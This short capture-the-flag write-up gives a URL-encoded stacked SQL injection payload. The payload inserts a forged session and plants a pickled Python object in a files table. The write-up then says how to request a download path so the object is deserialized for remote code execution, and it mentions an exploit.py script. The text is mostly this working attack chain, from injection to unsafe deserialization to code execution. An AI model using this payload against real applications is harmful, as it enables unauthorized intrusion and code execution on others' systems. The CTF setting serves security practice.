The 2 SQLI payloads + python deserialized object to RCE:
\;%0AINSERT%0AOR%0AIGNORE%0AINTO%0Aactivesessions%0A(sessionid,%0Ausername,%0Atimestamp)%0AVALUES%0A(\TESTCTF\,%0A\TESTCTF\,%0A\TESTCTF\);%0AINSERT%0AINTO%0Afiles%0A(filename,%0Adata,%0Asessionid)%0AVALUES%0A(\\{filename}\,%0A\\{pickled}\,%0A\TESTCTF\\);--

Then navigate to the path /download/{filename}/{sessionid} using the injected sessionid and filename.
This will trigger the deserialization of the object, resulting in a remote code execution

script available on exploit.py
